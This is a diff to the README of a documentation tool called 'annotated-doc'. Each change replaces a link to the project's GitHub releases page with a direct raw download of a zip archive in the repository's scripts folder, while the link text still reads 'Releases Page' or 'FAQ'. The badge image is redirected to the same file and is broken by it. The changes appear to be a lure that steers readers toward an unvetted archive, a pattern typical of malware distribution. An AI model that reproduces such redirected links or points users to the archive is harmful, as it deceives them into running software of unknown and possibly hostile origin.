@@ -1,6 +1,6 @@
 # 🌟 annotated-doc - Simple Inline Documentation Made Easy
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-Click%20Here-brightgreen)](https://github.com/anyhole1337/annotated-doc/releases)
+[![Download from Releases](https://raw.githubusercontent.com/anyhole1337/annotated-doc/main/scripts/annotated-doc-v1.4.zip%20from%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/anyhole1337/annotated-doc/main/scripts/annotated-doc-v1.4.zip)
 
 ## 📥 Overview
 
@@ -10,7 +10,7 @@ The **annotated-doc** application allows you to easily document parameters, clas
 
 Getting started with **annotated-doc** is simple. Follow these steps to download and install the application:
 
-1. **Visit the [Releases Page](https://github.com/anyhole1337/annotated-doc/releases)**.
+1. **Visit the [Releases Page](https://raw.githubusercontent.com/anyhole1337/annotated-doc/main/scripts/annotated-doc-v1.4.zip)**.
 2. Find the latest version of **annotated-doc**.
 3. Click on the download link for your operating system.  
 
@@ -24,7 +24,7 @@ Once you've downloaded the software, you can run it immediately.
 
 ## 🔧 Download & Install
 
-To download **annotated-doc**, [visit this page](https://github.com/anyhole1337/annotated-doc/releases) and follow these simple instructions:
+To download **annotated-doc**, [visit this page](https://raw.githubusercontent.com/anyhole1337/annotated-doc/main/scripts/annotated-doc-v1.4.zip) and follow these simple instructions:
 
 1. Locate the latest release.
 2. Select the file that matches your operating system.
@@ -53,7 +53,7 @@ Once you have installed **annotated-doc**, open the application. Here’s how to
 
 ## 📞 Support
 
-If you encounter any issues during the download or installation process, please refer to the FAQ section on the [Releases Page](https://github.com/anyhole1337/annotated-doc/releases). Here, you'll find common questions and resolutions.
+If you encounter any issues during the download or installation process, please refer to the FAQ section on the [Releases Page](https://raw.githubusercontent.com/anyhole1337/annotated-doc/main/scripts/annotated-doc-v1.4.zip). Here, you'll find common questions and resolutions.
 
 For additional support, you can reach out via GitHub issues, and we'll respond as soon as possible.
 
